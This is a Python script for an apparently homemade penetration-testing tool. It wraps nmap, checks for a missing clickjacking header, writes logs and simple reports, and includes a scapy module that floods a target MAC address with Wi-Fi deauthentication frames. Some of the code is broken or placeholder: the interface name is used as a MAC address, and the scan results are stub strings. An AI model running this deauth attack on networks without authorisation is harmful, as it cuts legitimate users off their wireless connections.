import sys
import os
import logging
import threading
import subprocess
import requests
from scapy.all import *
import argparse

# Setup logging
logging.basicConfig(filename='aegis.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Base class for modules
class BaseModule:
    def __init__(self, target, options):
        self.target = target
        self.options = options

    def run(self):
        raise NotImplementedError("Each module must implement the run method.")

# HTTP Vulnerability Scanner Module
class HTTPScanner(BaseModule):
    def run(self):
        try:
            response = requests.get(self.target, timeout=self.options.get('http_timeout', 10),
                                    headers={"User-Agent": self.options.get('http_user_agent', "Mozilla/5.0")})
            if "X-Frame-Options" not in response.headers:
                print(f"{self.target} is vulnerable to Clickjacking.")
                logging.info(f"{self.target} is vulnerable to Clickjacking.")
            # Add more vulnerability checks here
        except Exception as e:
            print(f"Error scanning {self.target}: {e}")
            logging.error(f"Error scanning {self.target}: {e}")

# Port Scanner Module
class PortScanner(BaseModule):
    def run(self):
        print(f"Scanning ports for {self.target}...")
        try:
            subprocess.run(['nmap', '-p', '21,22,23,80,443,3389', self.target])
            logging.info(f"Completed port scan for {self.target}")
        except Exception as e:
            print(f"Error scanning ports for {self.target}: {e}")
            logging.error(f"Error scanning ports for {self.target}: {e}")

# Wi-Fi Attack Module
class WiFiAttacker(BaseModule):
    def run(self):
        print(f"Attacking Wi-Fi network on {self.target}...")
        try:
            iface = self.options.get('interface', 'wlan0')
            target_mac = self.target
            pkt = RadioTap()/Dot11(addr1=target_mac, addr2=iface, addr3=iface)/Dot11Deauth()
            sendp(pkt, iface=iface, count=100, inter=0.1)
            print("Attack complete.")
            logging.info(f"Executed Wi-Fi deauth attack on {self.target}")
        except Exception as e:
            print(f"Error during Wi-Fi attack on {self.target}: {e}")
            logging.error(f"Error during Wi-Fi attack on {self.target}: {e}")

# Log Viewer Module
class LogViewer:
    def view_logs(self):
        if os.path.exists('aegis.log'):
            with open('aegis.log', 'r') as log_file:
                print(log_file.read())
        else:
            print("No logs available.")

# Report Generator
class ReportGenerator:
    def generate_report(self, target, scan_results, vulnerability_results):
        report = f"Report for {target}\n"
        report += "=" * 40 + "\n"
        report += "Port Scanning Results:\n"
        report += scan_results + "\n"
        report += "=" * 40 + "\n"
        report += "Vulnerability Scanning Results:\n"
        report += vulnerability_results + "\n"

        with open(f"{target}_report.txt", 'w') as report_file:
            report_file.write(report)
        print(f"Report generated: {target}_report.txt")
        logging.info(f"Report generated for {target}")

# Multi-threaded scanner
class MultiThreadScanner:
    def __init__(self, targets, module, options, threads=10):
        self.targets = targets
        self.module = module
        self.options = options
        self.threads = threads

    def worker(self, target):
        module_instance = self.module(target, self.options)
        module_instance.run()

    def run(self):
        thread_list = []
        for target in self.targets:
            t = threading.Thread(target=self.worker, args=(target,))
            t.start()
            thread_list.append(t)
            if len(thread_list) >= self.threads:
                for thread in thread_list:
                    thread.join()
                thread_list = []

# Menu system
def main_menu():
    target = None
    scan_results = ""
    vulnerability_results = ""

    while True:
        print("\nAegis Penetration Testing Framework")
        print("1. Define Target")
        print("2. Run Nmap Port Scanner")
        print("3. Scan for Vulnerabilities")
        print("4. Generate Report")
        print("5. View Logs")
        print("6. Exit")

        choice = input("Select an option: ")

        if choice == '1':
            target = input("Enter the target URL or IP address: ")
            logging.info(f"Target defined: {target}")

        elif choice == '2':
            if target:
                scanner = PortScanner(target, {})
                scanner.run()
                scan_results = "Port scanning completed."  # Placeholder, replace with actual results
            else:
                print("Please define a target first.")

        elif choice == '3':
            if target:
                scanner = HTTPScanner(target, {})
                scanner.run()
                vulnerability_results = "Vulnerability scanning completed."  # Placeholder, replace with actual results
            else:
                print("Please define a target first.")

        elif choice == '4':
            if target and scan_results and vulnerability_results:
                report_generator = ReportGenerator()
                report_generator.generate_report(target, scan_results, vulnerability_results)
            else:
                print("Please complete the port scan and vulnerability scan first.")

        elif choice == '5':
            viewer = LogViewer()
            viewer.view_logs()

        elif choice == '6':
            print("Exiting Aegis...")
            sys.exit()

        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()
